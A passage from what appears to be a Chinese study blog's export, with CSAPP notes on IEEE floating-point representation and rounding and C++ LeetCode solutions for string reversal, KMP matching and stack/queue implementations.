<td align="center">1.1001</td>
<td align="center">1.5625</td>
</tr>
<tr>
<td align="center">43&#x2F;16</td>
<td align="center">10.1011</td>
<td align="center">2.6875</td>
</tr>
<tr>
<td align="center">9&#x2F;8</td>
<td align="center">1.001</td>
<td align="center">1.125</td>
</tr>
<tr>
<td align="center">47&#x2F;8</td>
<td align="center">101.111</td>
<td align="center">5.875</td>
</tr>
<tr>
<td align="center">51&#x2F;16</td>
<td align="center">11.0011</td>
<td align="center">3.1875</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h3 id="2-4-2IEEE浮点表示"><a href="#2-4-2IEEE浮点表示" class="headerlink" title="2.4.2IEEE浮点表示"></a>2.4.2IEEE浮点表示</h3><ul>
<li><p>定义</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231014210447098.png" alt="image-20231014210447098"></li>
</ul>
</li>
<li><p>根据exp的值，被编码的值可以分为三种不同的情况</p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231014211753784.png" alt="image-20231014211753784"><ul>
<li>非规格化的值偏置设置为1-bias 而不是简单的-bias，主要是为了从非规格化值平滑转换到规格化值的方法</li>
</ul>
</li>
<li>非规格化的用途：<ul>
<li>提供了一种数值零的表示方法 +0.0位模式表示为：符号位是0，阶码字段全是0，小数域也全为0。当符号位为1 其他域全为0，则得到了-0.0。</li>
<li>表示非常接近于0.0的数，则提供了一种属性，称为逐渐溢出，可能的数值分布均匀的接近于0.0</li>
</ul>
</li>
<li>特殊值：<ul>
<li>阶码全为1，小数域为0，得到的值表示无穷，符号位为0时，表示是正无穷，符号位为1时 表示负无穷</li>
<li>小数域为非0时，则表示NaN &#x3D; not a number 不是一个数，可以用在数据初始化的时候。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-4-3-数字示例"><a href="#2-4-3-数字示例" class="headerlink" title="2.4.3 数字示例"></a>2.4.3 数字示例</h3><ul>
<li><img src="/2023/09/19/CSAPP/image-20231014213709753.png" alt="image-20231014213709753"></li>
<li>习题2.47<ul>
<li><img src="/2023/09/19/CSAPP/image-20231014214123591.png" alt="image-20231014214123591"></li>
</ul>
</li>
<li>有k位阶码和n位小数的浮点表示一般属性：<ul>
<li>值 +0.0总有一个全为0的位表示</li>
<li><img src="/2023/09/19/CSAPP/image-20231014214419895.png" alt="image-20231014214419895"></li>
</ul>
</li>
</ul>
<h3 id="2-4-4-舍入"><a href="#2-4-4-舍入" class="headerlink" title="2.4.4 舍入"></a>2.4.4 舍入</h3><ul>
<li><p>表示方法限制了浮点数的范围和精度，所以浮点数只能近似的表示实数运算</p>
</li>
<li><p>IEEE定义了四种舍入方式 </p>
<ul>
<li><img src="/2023/09/19/CSAPP/image-20231016193726141.png" alt="四种舍入方法"></li>
<li><img src="/2023/09/19/CSAPP/image-20231016193835926.png" alt="image-20231016193835926"></li>
<li>偶数舍入：对于不在两个整数中间的浮点数，找离其最近的整数，<strong>而在两个数字正中间的数。则按照让舍入位的最后一位为0来进行舍入（倾向于使最低有效位为0）。</strong></li>
</ul>
</li>
<li><p>习题2.50 偶数舍入规则 以下数为2进制 考虑舍入到二分之一 小数点右边一位</p>
<ul>
<li>10.010——10.0  —中间值</li>
<li>10.011——10.1 —-不是中间值</li>
<li>10.110——11.0  –中间值 ，倾向于最低有效位为0</li>
<li>11.001——11.0 —不是中间值</li>
</ul>
</li>
<li><p>习题2.51 2.52 略</p>
</li>
</ul>
<h3 id="2-4-5浮点运算"><a href="#2-4-5浮点运算" class="headerlink" title="2.4.5浮点运算"></a>2.4.5浮点运算</h3><ul>
<li>浮点加法不具有结合性<ul>
<li><img src="/2023/09/19/CSAPP/image-20231016200701932.png" alt="浮点加法"></li>
</ul>
</li>
<li>浮点数乘法满足单调性<ul>
<li><img src="/2023/09/19/CSAPP/image-20231016201644438.png" alt="浮点数乘法 "></li>
</ul>
</li>
</ul>
<h3 id="2-4-5c语言中浮点数转换"><a href="#2-4-5c语言中浮点数转换" class="headerlink" title="2.4.5c语言中浮点数转换"></a>2.4.5c语言中浮点数转换</h3><ul>
<li><img src="/2023/09/19/CSAPP/image-20231016202115282.png" alt="类型转换"></li>
</ul>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>c</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串</title>
    <url>/2023/09/25/%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><p>少用库函数！！！</p>
<h1 id="2-leetcode-344-反转字符串-E"><a href="#2-leetcode-344-反转字符串-E" class="headerlink" title="2.leetcode-344-反转字符串-E"></a>2.leetcode-344-反转字符串-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/reverse-string/description/">344. 反转字符串 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>将字符串反转，原地修数组，O(1)空间解决。</li>
<li>要求O(1)，则用双指针的方式实现！！</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reverseString</span><span class="params">(vector&lt;<span class="type">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> front = <span class="number">0</span>, behind = s.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//if (s.size() == 1) return s;</span></span><br><span class="line">        <span class="keyword">while</span> (front &lt; behind) &#123;</span><br><span class="line">            <span class="type">int</span> temp = s[front];</span><br><span class="line">            s[front] = s[behind];</span><br><span class="line">            s[behind] = temp;</span><br><span class="line">            front++;</span><br><span class="line">            behind--;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//可以用swap()函数进行交换</span></span><br><span class="line"><span class="comment">//swap()有两种实现方式</span></span><br><span class="line"><span class="comment">//一种是上面的</span></span><br><span class="line"><span class="comment">//另一种是进行位运算</span></span><br><span class="line"><span class="comment">//s[i] ^= s[j];</span></span><br><span class="line"><span class="comment">//s[j] ^= s[i];</span></span><br><span class="line"><span class="comment">//s[i] ^= s[j];</span></span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n)</li>
<li>空间复杂度：O(1)</li>
</ul>
<h1 id="3-leetcode-541-反转字符串Ⅱ-E"><a href="#3-leetcode-541-反转字符串Ⅱ-E" class="headerlink" title="3.leetcode-541-反转字符串Ⅱ-E"></a>3.leetcode-541-反转字符串Ⅱ-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/reverse-string-ii/description/">541. 反转字符串 II - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>计数到<code>2k</code>，反转<code>2k</code>中的前k个字符串</li>
<li>用到上个题实现的函数</li>
<li>每次都用<code>2k</code>判断，所以for循环可以写<code>i += 2k</code></li>
<li><img src="/2023/09/25/%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20230925101844388.png" alt="image-20230925101844388"></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseStr</span><span class="params">(string s, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i += <span class="number">2</span>*k) &#123;</span><br><span class="line">            <span class="comment">//满足2k，对前k个进行反转；不满足2k，但满足k个</span></span><br><span class="line">            <span class="keyword">if</span> (i + k &lt;= s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>() + i, s.<span class="built_in">begin</span>() + i + k);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//小于k的情况，对k进行反转</span></span><br><span class="line">                <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>() + i, s.<span class="built_in">end</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n)</li>
<li>空间复杂度：O(1)</li>
</ul>
<h1 id="4-leetcode-151-反转字符串中的单词-M"><a href="#4-leetcode-151-反转字符串中的单词-M" class="headerlink" title="4.leetcode-151-反转字符串中的单词-M"></a>4.leetcode-151-反转字符串中的单词-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/reverse-words-in-a-string/">151. 反转字符串中的单词 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>先把字符串反转，在针对单个单词进行反转</li>
<li>删除多于的空格：快慢指针<ul>
<li><code>erase()</code>复杂度<code>O(n)</code>，如果嵌套<code>for</code>循环则复杂度到<code>O(n^2)</code></li>
<li>优化：空间复杂度<code>O(1)</code> 原地修改字符串</li>
</ul>
</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//反转整个字符串</span></span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> idx = <span class="number">0</span>;<span class="comment">//用于记录已处理的字符位置</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> start = <span class="number">0</span>; start &lt; n; start++)&#123;</span><br><span class="line">            <span class="comment">//如果不是空格则遇到了单词</span></span><br><span class="line">            <span class="keyword">if</span>(s[start] != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//idx不等于0，则说明不是第一个单词 需要加空格</span></span><br><span class="line">                <span class="keyword">if</span>(idx != <span class="number">0</span>)&#123;</span><br><span class="line">                    s[idx++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//用于找到当前单词的末尾位置</span></span><br><span class="line">                <span class="type">int</span> end = start;<span class="comment">//快慢指针</span></span><br><span class="line">                <span class="keyword">while</span>(end &lt; n &amp;&amp; s[end] != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                    s[idx++] = s[end++];<span class="comment">//不是空格则补上该单词</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//反转整个单词 有一些空格删去了</span></span><br><span class="line">                <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>() + idx - (end - start), s.<span class="built_in">begin</span>() + idx);</span><br><span class="line">                <span class="comment">//更新start 寻找下一个单词</span></span><br><span class="line">                start = end;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        s.<span class="built_in">erase</span>(s.<span class="built_in">begin</span>() + idx, s.<span class="built_in">end</span>());<span class="comment">//将字符多余部分删除，可能有多余的空格</span></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n)</li>
<li>空间复杂度：O(1)</li>
</ul>
<h1 id="5-leecode-LCR-182-动态口令-E"><a href="#5-leecode-LCR-182-动态口令-E" class="headerlink" title="5.leecode-LCR-182-动态口令-E"></a>5.leecode-LCR-182-动态口令-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/description/">LCR 182. 动态口令 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li><p>不能申请额外空间，只能在本字符串上操作。</p>
</li>
<li><p>通过局部反转+整体反转</p>
</li>
<li><p>具体步骤：</p>
<ul>
<li>反转区间为前n的子串</li>
<li>反转区间为n到末尾的子串</li>
<li>反转整个字符串</li>
</ul>
</li>
<li><p><img src="/2023/09/25/%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20231004102501904.png" alt="image-20231004102501904"></p>
</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">dynamicPassword</span><span class="params">(string password, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">reverse</span>(password.<span class="built_in">begin</span>(), password.<span class="built_in">begin</span>() + target);<span class="comment">//第一次反转</span></span><br><span class="line">        <span class="built_in">reverse</span>(password.<span class="built_in">begin</span>() + target, password.<span class="built_in">end</span>());<span class="comment">//第二次反转</span></span><br><span class="line">        <span class="built_in">reverse</span>(password.<span class="built_in">begin</span>(), password.<span class="built_in">end</span>());<span class="comment">//最后反转</span></span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n) 反转字符串</li>
<li>空间复杂度：O(1) 在原字符串上操作</li>
</ul>
<h1 id="6-leetcode-28-找出字符串中第一个匹配项的下标-E"><a href="#6-leetcode-28-找出字符串中第一个匹配项的下标-E" class="headerlink" title="6.leetcode-28-找出字符串中第一个匹配项的下标-E"></a>6.leetcode-28-找出字符串中第一个匹配项的下标-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/description/">28. 找出字符串中第一个匹配项的下标 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li><code>KMP</code>算法：解决字符串匹配的问题<ul>
<li>前缀：包含首字母，不包含尾字母的所有子串</li>
<li>后缀：包含尾字母，不包含首字符的所有子串</li>
<li>求最长相等前后缀</li>
<li><img src="/2023/09/25/%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20231004105940218.png" alt="前缀表"></li>
<li><code>next</code>数组作为前缀表存储数组</li>
</ul>
</li>
<li>i表示后缀末尾，j表示前缀末尾以及最长相等前后缀的值</li>
</ul>
<p><strong>kmp代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">getNext</span><span class="params">(<span class="type">int</span>* next, <span class="type">const</span> string&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        next[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; s[i] != s[j]) &#123;</span><br><span class="line">                j = next[j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == s[j]) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">strStr</span><span class="params">(string haystack, string needle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (needle.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> next[needle.<span class="built_in">size</span>()];</span><br><span class="line">        <span class="built_in">getNext</span>(next, needle);</span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; haystack.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(j &gt; <span class="number">0</span> &amp;&amp; haystack[i] != needle[j]) &#123;</span><br><span class="line">                j = next[j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (haystack[i] == needle[j]) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == needle.<span class="built_in">size</span>() ) &#123;</span><br><span class="line">                <span class="keyword">return</span> (i - needle.<span class="built_in">size</span>() + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n+m)</li>
<li>空间复杂度：O(m)</li>
</ul>
<p><strong>暴力法代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">strStr</span><span class="params">(string haystack, string needle)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = haystack.<span class="built_in">size</span>(), m = needle.<span class="built_in">size</span>(), ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(m &gt; n) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(haystack[i] == needle[<span class="number">0</span>])&#123;</span><br><span class="line">                <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = m - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i + j &lt; n &amp;&amp; needle[j] == haystack[i + j])&#123;</span><br><span class="line">                        count++;<span class="comment">//向后匹配</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(count == m)&#123;</span><br><span class="line">                    ans = i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n+m)</li>
<li>空间复杂度：O(1)</li>
</ul>
<h1 id="7-leetcode-459-重复的子字符串-E"><a href="#7-leetcode-459-重复的子字符串-E" class="headerlink" title="7.leetcode-459-重复的子字符串-E"></a>7.leetcode-459-重复的子字符串-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/repeated-substring-pattern/description/">459. 重复的子字符串 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong><a href="https://programmercarl.com/0459.%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2.html#%E6%80%9D%E8%B7%AF">代码随想录 (programmercarl.com)</a></p>
<ul>
<li><p>移动匹配</p>
<ul>
<li><p>s+s 拼接能出现新的s，在中间—&gt;必须删除首字母和尾字母</p>
</li>
<li><p><img src="/2023/09/25/%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20231009103250314.png" alt="s+s"></p>
</li>
<li><p>代码实现</p>
</li>
<li><pre><code class="c++">class Solution &#123;
public:
    bool repeatedSubstringPattern(string s) &#123;
        string t = s + s;
        t.erase(t.begin()); t.erase(t.end() - 1); // 掐头去尾
        if (t.find(s) != std::string::npos) return true; // 找到了子串
        return false;
    &#125;
&#125;;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 复杂度分析</span><br><span class="line"></span><br><span class="line">    - 时间复杂度：O(n+m) find 函数实现</span><br><span class="line">    - 空间复杂度：O(1)</span><br><span class="line"></span><br><span class="line">- KMP</span><br><span class="line"></span><br><span class="line">  - 最长相等前后缀不包含的子串即为重复子字符串</span><br><span class="line"></span><br><span class="line">  - ![image-20231009104841909](./字符串/image-20231009104841909.png)</span><br><span class="line"></span><br><span class="line">  - ![image-20231009105432604](./字符串/image-20231009105432604.png)</span><br><span class="line"></span><br><span class="line">  - 代码实现：</span><br><span class="line"></span><br><span class="line">  - ```c++</span><br><span class="line">    //前缀表减一</span><br><span class="line">    class Solution &#123;</span><br><span class="line">    public:</span><br><span class="line">        void getNext (int* next, const string&amp; s)&#123;</span><br><span class="line">            next[0] = -1;</span><br><span class="line">            int j = -1;</span><br><span class="line">            for(int i = 1;i &lt; s.size(); i++)&#123;</span><br><span class="line">                while(j &gt;= 0 &amp;&amp; s[i] != s[j + 1]) &#123;</span><br><span class="line">                    j = next[j];//next数组</span><br><span class="line">                &#125;</span><br><span class="line">                if(s[i] == s[j + 1]) &#123;</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                next[i] = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        bool repeatedSubstringPattern (string s) &#123;</span><br><span class="line">            if (s.size() == 0) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            int next[s.size()];</span><br><span class="line">            getNext(next, s);</span><br><span class="line">            int len = s.size();</span><br><span class="line">            if (next[len - 1] != -1 &amp;&amp; len % (len - (next[len - 1] + 1)) == 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>复杂度分析</p>
<ul>
<li>时间复杂度：O(n)</li>
<li>空间复杂度：O(n)</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>基础算法</category>
      </categories>
      <tags>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>栈与队列</title>
    <url>/2023/10/10/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><ul>
<li><p>参考：</p>
<ul>
<li><a href="https://programmercarl.com/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html">代码随想录 (programmercarl.com)</a></li>
</ul>
</li>
<li><p>队列：先进先出</p>
</li>
<li><p>栈：先进后出</p>
</li>
<li><p>栈和队列是<code>c++ STL</code>中的基本数据结构， 主要以<code>SGI STL</code>数据结构为例</p>
</li>
<li><p>栈：</p>
<ul>
<li>栈是以底层容器完成其所有的工作，对外提供统一的接口，底层容器是可插拔的（也就是我们可以控制那种容器来实现栈的功能</li>
<li>STL中栈被归类位 <code>container adapter</code>（容器适配器），所有栈的底层实现可以是<code> vector</code>、<code>deque</code>、<code>list</code>等等都是可以的，<strong>若没有指定则是deque(双向队列)为缺省情况下栈底层的结构</strong></li>
<li><img src="/2023/10/10/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/image-20231010102457327.png" alt="栈底层实现"></li>
</ul>
</li>
<li><p>队列：</p>
<ul>
<li>先进先出</li>
<li>默认为deque为底层结构，同样也可以指定其他底层实现方式</li>
</ul>
</li>
</ul>
<h1 id="2-leetcode-232-用栈实现队列-E"><a href="#2-leetcode-232-用栈实现队列-E" class="headerlink" title="2.leetcode-232-用栈实现队列-E"></a>2.leetcode-232-用栈实现队列-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/implement-queue-using-stacks/description/">232. 用栈实现队列 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>队列：先入先出。栈：先入后出  ———–&gt;两个栈，一个入栈 一个 出栈<ul>
<li><img src="/2023/10/10/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/image-20231010104743117.png" alt="用栈实现队列"></li>
</ul>
</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; stIn;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; stOut;</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="built_in">MyQueue</span>() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        stIn.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 只有当stOut为空的时候，再从stIn里导入数据（导入stIn全部数据）</span></span><br><span class="line">        <span class="keyword">if</span> (stOut.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="comment">// 从stIn导入数据直到stIn为空</span></span><br><span class="line">            <span class="keyword">while</span>(!stIn.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                stOut.<span class="built_in">push</span>(stIn.<span class="built_in">top</span>());</span><br><span class="line">                stIn.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> result = stOut.<span class="built_in">top</span>();</span><br><span class="line">        stOut.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Get the front element. */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="keyword">this</span>-&gt;<span class="built_in">pop</span>(); <span class="comment">// 直接使用已有的pop函数</span></span><br><span class="line">        stOut.<span class="built_in">push</span>(res); <span class="comment">// 因为pop函数弹出了元素res，所以再添加回去</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stIn.<span class="built_in">empty</span>() &amp;&amp; stOut.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：push 和empty 都为O(1)，pop 和peek为O(n) </li>
<li>空间复杂度：O(n)</li>
</ul>
<h1 id="3-leetcode-225-用队列实现栈-M"><a href="#3-leetcode-225-用队列实现栈-M" class="headerlink" title="3.leetcode-225-用队列实现栈-M"></a>3.leetcode-225-用队列实现栈-M</h1><p><strong>题目：<a href="https://leetcode.cn/problems/implement-stack-using-queues/description/">225. 用队列实现栈 - 力扣（LeetCode）</a></strong></p>
<p><strong>思路：</strong></p>
<ul>
<li>用队列来实现栈—用一个队列就可以模拟</li>
<li>把前面元素取出 再加入队列中<ul>
<li><img src="/2023/10/10/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/image-20231015154924625.png" alt="image-20231015154924625"></li>
</ul>
</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; que;</span><br><span class="line">    <span class="built_in">MyStack</span>() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        que.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">        size--;<span class="comment">//减一 留出要pop 的元素</span></span><br><span class="line">        <span class="keyword">while</span> (size--) &#123;</span><br><span class="line">            que.<span class="built_in">push</span>(que.<span class="built_in">front</span>());</span><br><span class="line">            que.<span class="built_in">pop</span>();<span class="comment">//不断将前面元素取出再push进去</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> 